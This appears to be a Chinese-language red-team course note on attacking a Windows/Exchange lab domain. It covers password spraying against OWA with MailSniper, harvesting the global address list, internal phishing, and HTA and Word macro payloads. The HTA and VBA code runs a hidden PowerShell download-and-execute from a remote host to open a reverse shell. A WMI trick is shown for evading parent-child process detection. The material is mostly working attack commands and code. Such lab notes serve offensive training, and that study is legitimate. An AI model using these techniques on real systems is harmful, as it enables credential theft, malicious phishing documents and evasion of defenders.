# 密码喷洒（Password Spraying）

3个工具:

## [namemash.py](https://gist.github.com/superkojiman/11076951)
一个根据完整用户名名单得到用户名各种组合的python工具
```
/opt/namemash.py names.txt >> possible-usernames.txt
```


## [MailSniper](https://github.com/dafthack/MailSniper)

引入
```
ipmo C:\Tools\MailSniper\MailSniper.ps1
```

枚举NetBIOS name
```
Invoke-DomainHarvestOWA -ExchHostname 10.10.15.100
```

验证哪些名字是域里的有效用户名
```
Invoke-UsernameHarvestOWA -ExchHostname 10.10.15.100 -Domain CYBER -UserList .\possible-usernames.txt -OutFile valid.txt
```

对上面的有效用户名进行密码喷洒,密码：```Summer2021```
```
Invoke-PasswordSprayOWA -ExchHostname 10.10.15.100 -UserList .\valid.txt -Password Summer2021
```

注意：在现实渗透中，过多的喷洒尝试可能会暴露自己，以及导致用户被锁


使用MailSniper 下载全局地址列表
```
PS C:\> Get-GlobalAddressList -ExchHostname 10.10.15.100 -UserName CYBER\iyates -Password Summer2021 -OutFile gal.txt
[*] First trying to log directly into OWA to enumerate the Global Address List using FindPeople...
[*] This method requires PowerShell Version 3.0
[*] Using https://10.10.15.100/owa/auth.owa
[*] Logging into OWA...
[*] OWA Login appears to be successful.
[*] Retrieving OWA Canary...
[*] Successfully retrieved the X-OWA-CANARY cookie: ahhlRb0kZUKEg8YEo5ZZtQDYwqU8EdkIl7OJ7_ugwGfk56YCYe0ilgE2GKVxCNJTMpqknR3QJ_M.
[*] Retrieving AddressListId from GetPeopleFilters URL.
[*] Global Address List Id of b4477ba8-52b0-48bf-915e-d179db98788b was found.
[*] Now utilizing FindPeople to retrieve Global Address List
[*] Now cleaning up the list...
bfarmer@cyberbotic.io
iyates@cyberbotic.io
jadams@cyberbotic.io
jking@cyberbotic.io
nglover@cyberbotic.io
[*] A total of 5 email addresses were retrieved
[*] Email addresses have been written to gal.txt
```


## [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit)


# 内部网络钓鱼

> 访问一个或多个内部邮箱开辟了一些可能性。我们可以搜索可能包含文档、用户名和密码等敏感信息的电子邮件；甚至代表受感染用户向员工发送电子邮件。我们可以发送我们自己制作的文件和/或链接，或者甚至下载已经在收件箱中的文档，将其后门（例如使用宏），然后将其发回给某人


# HTML Application (HTA)

hta客户端攻击

原理：在html中嵌入VBScript或者JScript代码，用户点击页面时触发代码执行

下面这段代码双击以后在用户电脑中打开一个计算器
```
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```


只要把上面代码修改一行,就可以唤起powershell执行一个rev shell
```
shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"""
```

执行64位powershell，需指明路径
```
C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe
```

注意上面```sysnative```是```System32```的别名


下面代码判断目标机器的架构，从而决定启用哪个powershell(x86还是x64)
```
Function Pwn()
  Set shell = CreateObject("wscript.Shell")

  If shell.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%") = "AMD64" Then
    shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.120/a'))"""
  Else
    shell.run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.120/b'))"""
  End If

End Function
```

# Visual Basic for Applications (VBA) Macro's

宏攻击

vba和vbscript差别不大，上面计算器的脚本稍微改一下就可以作为vba运行
```
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

函数名为AutoOpen时是自动运行的意思

同样的，也可以在vba中调用powershell，也需要注意架构问题，是32位还是64位。如果是64位，像上面一样指明路径。

需要注意，文件扩展名必须是```.doc```。

因为```.docx```文件无法保存宏代码。

## HTA 网络钓鱼

cobaltstrike

Attacks > Web drive-by > Host File

创建一个hta链接，发送给目标用户，诱使用户点击。


## Word Doc 网络钓鱼

把rev shell的vba放进doc文件，发送给用户，诱使用户打开。


# Parent-Child Relationships

父子进程

一个父进程可以有很多子进程，但是一个子进程只能有一个父进程。

观察进程关系，可以从防守角度察觉到攻击。

一个winword.exe父进程下如果运行了powershell.exe子进程，那将是非常可疑的，很可能是执行了可疑程序。

从进攻角度，打破这种关系可以使用 WMI Win32_Process 类来创建进程
```
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell"
```

在这种情况下，PowerShell 将是WmiPrvSE.exe而不是 MS Word 的子进程。

# Building Alerts in Kibana

在Kibana中构建警报

